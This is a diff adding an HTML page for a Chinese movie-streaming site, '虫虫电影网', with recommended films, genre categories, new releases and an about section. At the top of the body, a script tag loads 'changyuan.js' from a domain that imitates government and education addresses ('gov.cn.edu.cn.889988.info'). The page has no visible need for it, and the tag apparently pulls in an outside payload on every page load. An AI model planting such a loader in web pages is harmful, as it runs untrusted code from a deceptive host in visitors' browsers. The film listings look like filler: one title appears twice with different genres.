@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>虫虫电影网 - 轻松观影，快乐生活</title>
+<meta name="keywords" content="虫虫电影网, 在线电影, 热门影视, 轻松观影, 高清视频">
+<meta name="description" content="虫虫电影网（chongchongdianyingwang-top）为您提供轻松愉快的观影体验，海量高清电影、电视剧、动漫每日更新，随时随地畅享精彩。">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: 'Nunito', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    background: #f0faf0;
+    color: #2d4a2d;
+    line-height: 1.7;
+    overflow-x: hidden;
+}
+
+/* 顶部装饰条 */
+.top-banner {
+    background: linear-gradient(90deg, #66bb6a, #43a047, #66bb6a);
+    height: 4px;
+}
+
+/* 导航 */
+.header {
+    background: #ffffff;
+    box-shadow: 0 2px 20px rgba(76, 175, 80, 0.1);
+    position: sticky;
+    top: 0;
+    z-index: 999;
+}
+.nav-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 15px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+.logo-box {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+.logo-icon {
+    width: 42px;
+    height: 42px;
+    background: linear-gradient(135deg, #66bb6a, #43a047);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 22px;
+    animation: bounce 2s infinite;
+}
+@keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-5px); }
+}
+.logo-text {
+    font-size: 22px;
+    font-weight: 800;
+    color: #2e7d32;
+}
+.logo-text span {
+    color: #66bb6a;
+}
+.nav-links {
+    display: flex;
+    gap: 28px;
+    list-style: none;
+}
+.nav-links a {
+    text-decoration: none;
+    color: #4a7c4a;
+    font-weight: 600;
+    font-size: 15px;
+    padding: 6px 14px;
+    border-radius: 20px;
+    transition: all 0.3s;
+}
+.nav-links a:hover {
+    background: #e8f5e9;
+    color: #2e7d32;
+}
+
+/* 欢迎横幅 */
+.welcome {
+    background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 50%, #a5d6a7 100%);
+    padding: 60px 20px 50px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+}
+.welcome::before {
+    content: '🐛 🎬 🍃 🎬 🐛 🍃 🎬 🐛';
+    position: absolute;
+    top: 15px;
+    left: 0;
+    right: 0;
+    font-size: 20px;
+    opacity: 0.2;
+    letter-spacing: 30px;
+    animation: scrollLeft 20s linear infinite;
+}
+.welcome::after {
+    content: '🍃 🐛 🎬 🍃 🐛 🎬 🍃';
+    position: absolute;
+    bottom: 15px;
+    left: 0;
+    right: 0;
+    font-size: 18px;
+    opacity: 0.15;
+    letter-spacing: 25px;
+    animation: scrollRight 25s linear infinite;
+}
+@keyframes scrollLeft {
+    from { transform: translateX(0); }
+    to { transform: translateX(-50px); }
+}
+@keyframes scrollRight {
+    from { transform: translateX(0); }
+    to { transform: translateX(50px); }
+}
+.welcome-content {
+    position: relative;
+    z-index: 2;
+    max-width: 700px;
+    margin: 0 auto;
+}
+.welcome h1 {
+    font-size: clamp(28px, 5vw, 44px);
+    font-weight: 900;
+    color: #1b5e20;
+    margin-bottom: 15px;
+}
+.welcome h1 span {
+    color: #43a047;
+}
+.welcome p {
+    font-size: 17px;
+    color: #4a7c4a;
+    margin-bottom: 25px;
+}
+.welcome-btn {
+    display: inline-block;
+    padding: 13px 36px;
+    background: linear-gradient(135deg, #66bb6a, #43a047);
+    color: #fff;
+    text-decoration: none;
+    border-radius: 30px;
+    font-weight: 700;
+    font-size: 16px;
+    transition: all 0.3s;
+    box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+}
+.welcome-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 25px rgba(76, 175, 80, 0.45);
+}
+
+/* 通用区块 */
+.section {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 55px 20px;
+}
+.section-head {
+    text-align: center;
+    margin-bottom: 35px;
+}
+.section-head h2 {
+    font-size: 30px;
+    font-weight: 800;
+    color: #1b5e20;
+    margin-bottom: 8px;
+}
+.section-head h2 span {
+    color: #66bb6a;
+}
+.section-head p {
+    color: #7aaf7a;
+    font-size: 15px;
+}
+
+/* 栏目一：今日推荐 */
+.featured-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+    gap: 22px;
+}
+.featured-card {
+    background: #fff;
+    border-radius: 18px;
+    padding: 22px;
+    box-shadow: 0 4px 15px rgba(76, 175, 80, 0.08);
+    border: 2px solid transparent;
+    transition: all 0.3s;
+    position: relative;
+    overflow: hidden;
+}
+.featured-card:hover {
+    border-color: #a5d6a7;
+    transform: translateY(-5px);
+    box-shadow: 0 10px 30px rgba(76, 175, 80, 0.15);
+}
+.card-emoji {
+    font-size: 42px;
+    margin-bottom: 12px;
+}
+.featured-card h3 {
+    font-size: 17px;
+    color: #1b5e20;
+    margin-bottom: 6px;
+    font-weight: 700;
+}
+.featured-card .meta {
+    font-size: 13px;
+    color: #888;
+    margin-bottom: 10px;
+}
+.featured-card .desc {
+    font-size: 14px;
+    color: #5a8a5a;
+    line-height: 1.6;
+}
+.card-badge {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: #c8e6c9;
+    color: #2e7d32;
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 600;
+}
+
+/* 栏目二：影视分类 */
+.cat-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 16px;
+}
+.cat-item {
+    background: #fff;
+    border-radius: 16px;
+    padding: 22px 15px;
+    text-align: center;
+    box-shadow: 0 3px 12px rgba(76, 175, 80, 0.07);
+    transition: all 0.3s;
+    cursor: pointer;
+    border: 2px solid #e8f5e9;
+}
+.cat-item:hover {
+    background: linear-gradient(135deg, #66bb6a, #43a047);
+    border-color: #43a047;
+    transform: scale(1.05);
+}
+.cat-item:hover .cat-icon,
+.cat-item:hover .cat-name {
+    color: #fff;
+}
+.cat-icon {
+    font-size: 32px;
+    margin-bottom: 8px;
+    transition: color 0.3s;
+}
+.cat-name {
+    font-size: 14px;
+    font-weight: 700;
+    color: #2e7d32;
+    transition: color 0.3s;
+}
+.cat-count {
+    font-size: 12px;
+    color: #aaa;
+    margin-top: 4px;
+}
+
+/* 栏目三：最新上线 */
+.news-list {
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+}
+.news-item {
+    background: #fff;
+    border-radius: 14px;
+    padding: 18px 22px;
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    box-shadow: 0 3px 12px rgba(76, 175, 80, 0.07);
+    transition: all 0.3s;
+    border-left: 4px solid #66bb6a;
+}
+.news-item:hover {
+    box-shadow: 0 6px 20px rgba(76, 175, 80, 0.14);
+    transform: translateX(5px);
+}
+.news-num {
+    font-size: 22px;
+    font-weight: 900;
+    color: #a5d6a7;
+    min-width: 35px;
+}
+.news-info h4 {
+    font-size: 16px;
+    color: #1b5e20;
+    margin-bottom: 3px;
+    font-weight: 700;
+}
+.news-info p {
+    font-size: 13px;
+    color: #7aaf7a;
+}
+.news-tag {
+    margin-left: auto;
+    background: #e8f5e9;
+    color: #43a047;
+    padding: 4px 12px;
+    border-radius: 12px;
+    font-size: 12px;
+    font-weight: 600;
+}
+
+/* 栏目四：关于我们 */
+.about-box {
+    background: #fff;
+    border-radius: 20px;
+    padding: 40px;
+    box-shadow: 0 4px 20px rgba(76, 175, 80, 0.08);
+    text-align: center;
+    max-width: 750px;
+    margin: 0 auto;
+}
+.about-box .about-icon {
+    font-size: 48px;
+    margin-bottom: 15px;
+}
+.about-box h3 {
+    font-size: 22px;
+    color: #1b5e20;
+    margin-bottom: 15px;
+    font-weight: 800;
+}
+.about-box p {
+    font-size: 15px;
+    color: #5a8a5a;
+    line-height: 1.9;
+    margin-bottom: 12px;
+}
+.about-box .site-url {
+    display: inline-block;
+    margin-top: 10px;
+    padding: 10px 25px;
+    background: #e8f5e9;
+    border-radius: 25px;
+    color: #2e7d32;
+    font-weight: 700;
+    font-size: 14px;
+}
+
+/* 底部 */
+.footer {
+    background: linear-gradient(135deg, #1b5e20, #2e7d32);
+    color: #fff;
+    padding: 40px 20px 25px;
+    text-align: center;
+}
+.footer-logo {
+    font-size: 20px;
+    font-weight: 800;
+    margin-bottom: 12px;
+}
+.footer-logo span {
+    opacity: 0.7;
+}
+.footer-nav {
+    display: flex;
+    justify-content: center;
+    gap: 22px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+}
+.footer-nav a {
+    color: rgba(255,255,255,0.75);
+    text-decoration: none;
+    font-size: 14px;
+    transition: color 0.3s;
+}
+.footer-nav a:hover {
+    color: #a5d6a7;
+}
+.footer-divider {
+    width: 60px;
+    height: 3px;
+    background: rgba(255,255,255,0.2);
+    margin: 18px auto;
+    border-radius: 2px;
+}
+.footer-copy {
+    font-size: 13px;
+    opacity: 0.6;
+}
+.footer-link {
+    font-size: 13px;
+    opacity: 0.8;
+    margin-top: 6px;
+}
+
+/* 移动端 */
+@media (max-width: 768px) {
+    .nav-links { display: none; }
+    .welcome { padding: 40px 15px 35px; }
+    .section { padding: 35px 15px; }
+    .section-head h2 { font-size: 24px; }
+    .featured-grid { grid-template-columns: 1fr; }
+    .cat-grid { grid-template-columns: repeat(3, 1fr); gap: 10px; }
+    .cat-item { padding: 16px 8px; }
+    .cat-icon { font-size: 26px; }
+    .cat-name { font-size: 12px; }
+    .news-item { padding: 14px 16px; gap: 12px; }
+    .news-num { font-size: 18px; }
+    .news-info h4 { font-size: 14px; }
+    .news-tag { display: none; }
+    .about-box { padding: 25px 18px; }
+}
+
+@media (max-width: 480px) {
+    .cat-grid { grid-template-columns: repeat(2, 1fr); }
+    .logo-text { font-size: 18px; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="top-banner"></div>
+
+<!-- 导航 -->
+<header class="header">
+    <div class="nav-inner">
+        <div class="logo-box">
+            <div class="logo-icon">🐛</div>
+            <div class="logo-text">虫虫<span>电影网</span></div>
+        </div>
+        <nav>
+            <ul class="nav-links">
+                <li><a href="#home">首页</a></li>
+                <li><a href="#recommend">今日推荐</a></li>
+                <li><a href="#category">影视分类</a></li>
+                <li><a href="#latest">最新上线</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<!-- 欢迎区 -->
+<section class="welcome" id="home">
+    <div class="welcome-content">
+        <h1>🐛 虫虫电影网 🎬</h1>
+        <p>轻松观影，快乐生活！海量高清影视资源每日更新，虫虫带您畅游电影世界</p>
+        <a href="#recommend" class="welcome-btn">开始探索 →</a>
+    </div>
+</section>
+
+<!-- 栏目一：今日推荐 -->
+<section class="section" id="recommend">
+    <div class="section-head">
+        <h2>今日<span>推荐</span></h2>
+        <p>编辑精选好片，每日更新不重样</p>
+    </div>
+    <div class="featured-grid">
+        <div class="featured-card">
+            <div class="card-badge">🔥 热门</div>
+            <div class="card-emoji">🎪</div>
+            <h3>疯狂的麦克斯：狂暴女神</h3>
+            <div class="meta">2024 · 动作/冒险 · 9.1分</div>
+            <div class="desc">末日废土中的极致飙车与战斗，视觉冲击力满分，虫虫电影网强烈推荐！</div>
+        </div>
+        <div class="featured-card">
+            <div class="card-badge">✨ 新片</div>
+            <div class="card-emoji">🎭</div>
+            <h3>坠落的审判</h3>
+            <div class="meta">2023 · 剧情/悬疑 · 8.7分</div>
+            <div class="desc">戛纳金棕榈获奖作品，一场精心设计的悬疑推理，层层剥开真相面纱。</div>
+        </div>
+        <div class="featured-card">
+            <div class="card-badge">💚 口碑</div>
+            <div class="card-emoji">🐉</div>
+            <h3>哥斯拉大战金刚2</h3>
+            <div class="meta">2024 · 科幻/怪兽 · 8.4分</div>
+            <div class="desc">两大巨兽再度联手，对抗远古终极威胁，视听盛宴不容错过。</div>
+        </div>
+        <div class="featured-card">
+            <div class="card-badge">🎯 精选</div>
+            <div class="card-emoji">🌸</div>
+            <h3>坠落的审判</h3>
+            <div class="meta">2023 · 动画/治愈 · 8.9分</div>
+            <div class="desc">细腻温暖的动画佳作，带你找回内心最初的感动与纯真。</div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目二：影视分类 -->
+<section class="section" id="category" style="background: #e8faf0; border-radius: 30px 30px 0 0;">
+    <div class="section-head">
+        <h2>影视<span>分类</span></h2>
+        <p>按类型快速找到你喜欢的影片</p>
+    </div>
+    <div class="cat-grid">
+        <div class="cat-item">
+            <div class="cat-icon">💥</div>
+            <div class="cat-name">动作片</div>
+            <div class="cat-count">1,286部</div>
+        </div>
+        <div class="cat-item">
+            <div class="cat-icon">👻</div>
+            <div class="cat-name">恐怖片</div>
+            <div class="cat-count">642部</div>
+        </div>
+        <div class="cat-item">
+            <div class="cat-icon">😂</div>
+            <div class="cat-name">喜剧片</div>
+            <div class="cat-count">958部</div>
+        </div>
+        <div class="cat-item">
+            <div class="cat-icon">💕</div>
+            <div class="cat-name">爱情片</div>
+            <div class="cat-count">873部</div>
+        </div>
+        <div class="cat-item">
+            <div class="cat-icon">🚀</div>
+            <div class="cat-name">科幻片</div>
+            <div class="cat-count">521部</div>
+        </div>
+        <div class="cat-item">
+            <div class="cat-icon">🕵️</div>
+            <div class="cat-name">悬疑片</div>
+            <div class="cat-count">734部</div>
+        </div>
+        <div class="cat-item">
+            <div class="cat-icon">📺</div>
+            <div class="cat-name">电视剧</div>
+            <div class="cat-count">2,156部</div>
+        </div>
+        <div class="cat-item">
+            <div class="cat-icon">🎨</div>
+            <div class="cat-name">动漫</div>
+            <div class="cat-count">1,403部</div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目三：最新上线 -->
+<section class="section" id="latest">
+    <div class="section-head">
+        <h2>最新<span>上线</span></h2>
+        <p>第一时间更新，抢先观看最新好片</p>
+    </div>
+    <div class="news-list">
+        <div class="news-item">
+            <div class="news-num">1</div>
+            <div class="news-info">
+                <h4>美国内战</h4>
+                <p>2024 · 战争/剧情 · 虫虫电影网首发</p>
+            </div>
+            <div class="news-tag">今日上新</div>
+        </div>
+        <div class="news-item">
+            <div class="news-num">2</div>
+            <div class="news-info">
+                <h4>你想活出怎样的人生</h4>
+                <p>2023 · 动画/奇幻 · 宫崎骏最新力作</p>
+            </div>
+            <div class="news-tag">热门</div>
+        </div>
+        <div class="news-item">
+            <div class="news-num">3</div>
+            <div class="news-info">
+                <h4>九龙城寨之围城</h4>
+                <p>2024 · 动作/犯罪 · 港片复兴之作</p>
+            </div>
+            <div class="news-tag">推荐</div>
+        </div>
+        <div class="news-item">
+            <div class="news-num">4</div>
+            <div class="news-info">
+                <h4>机器人之梦</h4>
+                <p>2023 · 动画/温情 · 无对白治愈佳作</p>
+            </div>
+            <div class="news-tag">口碑</div>
+        </div>
+        <div class="news-item">
+            <div class="news-num">5</div>
+            <div class="news-info">
+                <h4>默杀</h4>
+                <p>2024 · 悬疑/犯罪 · 暑期档黑马</p>
+            </div>
+            <div class="news-tag">热播</div>
+        </div>
+        <div class="news-item">
+            <div class="news-num">6</div>
+            <div class="news-info">
+                <h4>头脑特工队2</h4>
+                <p>2024 · 动画/喜剧 · 皮克斯年度大作</p>
+            </div>
+            <div class="news-tag">新片</div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目四：关于我们 -->
+<section class="section" id="about">
+    <div class="section-head">
+        <h2>关于<span>虫虫电影网</span></h2>
+    </div>
+    <div class="about-box">
+        <div class="about-icon">🐛🎬</div>
+        <h3>轻松观影，快乐生活</h3>
+        <p><strong>虫虫电影网</strong>（chongchongdianyingwang-top）是一个充满活力的影视分享平台，致力于让每一位影迷都能轻松找到好片、快乐观影。</p>
+        <p>我们每日更新最新电影、热播剧集、精品动漫，覆盖全类型影视资源，让您随时随地享受精彩内容。</p>
+        <p>虫虫电影网 —— 像小虫子一样，一点点啃食好电影的每一帧精彩！</p>
+        <div class="site-url">🌐 https://chongchongdianyingwang-top.github.io</div>
+    </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="footer-logo">🐛 虫虫电影网 <span>| chongchongdianyingwang-top</span></div>
+    <div class="footer-nav">
+        <a href="#home">首页</a>
+        <a href="#recommend">今日推荐</a>
+        <a href="#category">影视分类</a>
+        <a href="#latest">最新上线</a>
+        <a href="#about">关于我们</a>
+        <a href="#">免责声明</a>
+        <a href="#">合作联系</a>
+    </div>
+    <div class="footer-divider"></div>
+    <div class="footer-copy">© 2024 虫虫电影网 版权所有</div>
+    <div class="footer-link">https://chongchongdianyingwang-top.github.io</div>
+</footer>
+
+</body>
+</html>
